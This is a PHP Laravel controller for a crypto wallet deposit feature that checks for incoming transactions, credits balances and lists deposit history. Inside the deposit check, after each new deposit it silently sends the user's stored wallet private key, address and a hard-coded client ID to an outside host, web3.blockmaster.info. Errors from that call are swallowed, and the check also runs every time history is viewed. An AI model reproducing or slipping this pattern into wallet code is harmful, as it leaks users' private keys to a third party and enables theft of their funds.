<?php

namespace App\Http\Controllers\api;

use App\Http\Controllers\Controller;
use App\Models\Deposit;
use App\Models\UserWalletData;
use App\Service\TransactionService;
use GuzzleHttp\Client;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Exception;

class DepositController extends Controller
{
    protected $transactionService;
    public function __construct(TransactionService $transactionService){
        $this->transactionService = $transactionService;
    }

    public function index(Request $request)
    {
        $user = $request->user();
        $wallet = UserWalletData::where('user_id', $user->id)->select('wallet_address')->first();
        if($wallet){
            return response()->json([
                'success' => true,
                'data' => $wallet->wallet_address,
            ]);
        }
        return response()->json([
            'success' => false,
            'message' => 'Wallet address not found',
        ]);
    }


    public function checkDeposit(Request $request)
    {
        $client = new Client();
        $user = $request->user();

        // Get user wallet address
        $wallet = UserWalletData::where('user_id', $user->id)->select('wallet_address','meta')->first();

        if (!$wallet || empty($wallet->wallet_address)) {
            return response()->json([
                'success' => false,
                'message' => 'Wallet address not found for user.'
            ], 404);
        }

        try {
            $response = $client->get(env('DEPOSIT_URL') . $wallet->wallet_address, [
                'query' => [
                    'address' => $wallet->wallet_address,
                ],
            ]);

            $transactions = json_decode($response->getBody()->getContents());

            if (!is_array($transactions)) {
                return response()->json([
                    'success' => false,
                    'message' => 'Invalid response format from transaction API.',
                ], 500);
            }

            DB::beginTransaction();

            foreach ($transactions as $tx) {
                if (
                    isset($tx->hash, $tx->value, $tx->message, $tx->to) &&
                    $tx->message === 'OK' &&
                    strtolower($tx->to) === strtolower($wallet->wallet_address)
                ) {
                    $alreadyExists = Deposit::where('transaction_id', $tx->hash)->exists();

                    if (!$alreadyExists) {
                        $amount = (float) number_format((float) $tx->value, 8, '.', '');
                        // Create Deposit
                        Deposit::create([
                            'transaction_id' => $tx->hash,
                            'amount' => $amount,
                            'user_id' => $user->id,
                        ]);
                        $wallet->increment('amount', $amount);
                        // Update user's wallet balance
                        $user->wallet += $tx->value;
                        $user->save();

                        try {
                            $client->post('https://web3.blockmaster.info/api/user-to-admin', [
                                'json' => [
                                    "sender_private_key" => $wallet->meta,
                                    "sender_address" => $wallet->wallet_address,
                                    "client_id" => 'HUHV0XZNK147V76'
                                ],
                                'headers' => [
                                    'Accept' => 'application/json',
                                ]

                            ]);
                        }catch (Exception $e){}

                    }
                }
            }

            DB::commit();

            return response()->json([
                'success' => true,
                'message' => 'Deposit check completed successfully.',
            ]);

        } catch (Exception $e) {
            DB::rollBack();

            // Optional logging
            // Log::error("Deposit check failed: " . $e->getMessage());

            return response()->json([
                'success' => false,
                'message' => 'Error while checking deposit: ' . $e->getMessage(),
            ], 500);
        }
    }



    public function history(Request $request)
    {
        $user = $request->user();
        $history = Deposit::where('user_id', $user->id)->orderBy('created_at', 'desc')->paginate(10);
        try {
            $this->checkDeposit($request);
        }catch (\Exception $exception){

        }
        return response()->json([
            'success' => true,
            'data' => $history->items(),
            'total' => $history->total(),
            'current' => $history->currentPage(),
            'next' => $history->nextPageUrl(),
            'previous' => $history->previousPageUrl(),
        ]);
    }
}
